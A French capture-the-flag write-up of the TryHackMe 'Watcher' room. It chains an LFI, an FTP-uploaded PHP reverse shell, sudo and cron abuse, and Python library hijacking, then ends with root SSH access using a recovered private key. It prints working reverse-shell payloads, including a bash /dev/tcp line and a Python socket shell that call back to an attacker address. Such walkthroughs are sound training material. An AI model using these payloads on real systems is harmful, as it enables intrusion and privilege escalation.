# THM Watcher
IP : 10.10.114.38

Une room fort sympatique. Elle permet d'exploiter un panel varier d'exploit. Très cool !

# Enum :
## Nmap
```sh   
# Nmap 7.94 scan initiated Wed Oct 25 07:35:07 2023 as: nmap -sC -sV -p- -oN nmap.txt 10.10.114.38
Nmap scan report for 10.10.114.38
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 25 07:35:41 2023 -- 1 IP address (1 host up) scanned in 33.86 seconds
```
# Flag 1
Sur la page /robots.txt on trouve 2 pages :
```robots.txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
``` flag_1.txt
FLAG{robots_***_****_****_**_next}
```
# Flag 2
La page http://10.10.114.38/secret_file_do_not_read.txt est interdite d'accès, mais on va essayer de contourner cela.
On va test d'ajouter le headers **X-Forwarded-For** avec **127.0.0.1**

Cela ne fonctionne pas.

En regardant l'URL de plus prêt quand on regarde un article, par exemple : http://10.10.114.38/post.php?post=striped.php
On peux voir ici qu'on peux essayer d'exploiter une LFI (Local File Inclusion). On va donc essayer d'afficher notre fichier secret !

Voici l'url avec la LFI : http://10.10.114.38/post.php?post=secret_file_do_not_read.txt

Et le résultat :
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:g************7
```
Nous avond donc des creds pour le FTP !
Et on y trouve le flag 2 !
```sh
ftp> ls -la
229 Entering Extended Passive Mode (|||48556|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```
Le dossier "files" et vide.
```flag_2.txt
FLAG{ftp_***_***_me}
```
# Flag 3
On sait que le site est vulnérable au LFI, nous savons aussi que le FTP pointe sur **/home/ftpuser/ftp/files**
On va tenter d'upload un shell et de l'avoir avec la LFI.
```sh
ftp> put rshell.php
local: rshell.php remote: rshell.php
229 Entering Extended Passive Mode (|||44821|)
150 Ok to send data.
100% |***********************************************************************************************************************************************|  5494       40.30 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (52.78 KiB/s)
```
On va ensuite sur l'url qui pointe vers le rshell:
```
http://10.10.114.38/post.php?post=/home/ftpuser/ftp/files/rshell.php
```
Et voici le reverseshell:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                              
listening on [any] 4444 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 44262
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:22:45 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
On stabilise le shell :
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
-> CTRL+Z
stty raw -echo; fg
```
On peu partir a la recherche du flag 3.
```
www-data@watcher:/$ find / -name flag_3.txt 2</dev/null
/var/www/html/more_secrets_a9f10a/flag_3.txt
```
Et voila.
```flag_3.txt
FLAG{lfi_****_*_guy}
```
# Flag 4
Le flag 4 ce trouve dans le dossier **/home/toby**.
Nous devons trouver le moyen de devenir Toby.

On trouve une note:
```note.txt
www-data@watcher:/home/toby$ cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
et effectivement, un script s'execute dans une tâche cron :
```sh
www-data@watcher:/home/toby/jobs$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```
Le script :
```sh
www-data@watcher:/home/toby/jobs$ cat cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```
En regardant les droits sudo, on vois ca :
```sh
www-data@watcher:/home/toby$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```
On peu donc facilement prendre le shell de Toby
```
www-data@watcher:/home/toby/jobs$ sudo -u toby /bin/bash
toby@watcher:~/jobs$ 
```
```flag_4.txt
toby@watcher:~$ cat flag_4.txt 
FLAG{****_life*****}
```
# Flag 5
On va ajouter un revshell dans le script **cow.sh** pour récupèrer le compte de mat.
```sh
toby@watcher:~/jobs$ echo "/bin/bash -i >& /dev/tcp/{IP}/1234 0>&1" >> cow.sh
toby@watcher:~/jobs$ 
toby@watcher:~/jobs$ cat cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
/bin/bash -i >& /dev/tcp/{IP}/1234 0>&1
toby@watcher:~/jobs$ 
```
Plus qu'a attendre que la tâche cron execute le script et voila !
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                              
listening on [any] 1234 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 59342
bash: cannot set terminal process group (2495): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ 
```
```flag_5.txt
mat@watcher:~$ cat flag_5.txt
FLAG{live_**_***_***_***_**_***_cow}
```
# Flag 6
On trouve une note dans le **/home** de **mat**
```
mat@watcher:~$ cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```
On sait donc qu'il peux executer un script:
```sh
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```
Il y a 2 scripts:
```cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```
```will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```
On peux modifier le fichier cmd.py qui sert de lib pour le script de will.
On va donc modifier cette lib et y ajouter un revershell.
```cmd.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IP}",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

import pty
pty.spawn("/bin/bash")
```
Ensuite, on execute le script (Sans oublier de démarrer le listener !)
```sh
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 3
```
Et nous voila en tant que will !
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 5555                              
listening on [any] 5555 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 35824
will@watcher:~/scripts$ 
```
```flag_6.txt
will@watcher:/home/will$ cat flag_6.txt
FLAG{but_*_********_**_******_***_secure}
```
# Flag 7
Après de grandes recherches, je trouve dans **/opt/backups** un fichier **key.b64**
```key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4e****************************0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```
Qui donne la clé SSH :
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50g*************************************6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```
On peux ensuite se connecté en SSH, et comme la config de SSH permet le login en tant que root, on peux donc directement se connecté en root avec la clé :
```sh
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Watcher]
└─$ ssh -i id_rsa root@10.10.114.38
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 25 13:48:47 UTC 2023

  System load:  0.08               Processes:             122
  Usage of /:   22.5% of 18.57GB   Users logged in:       0
  Memory usage: 46%                IP address for eth0:   10.10.114.38
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~#
```

```flag_7.txt
FLAG{who_******_***_watchers}
```
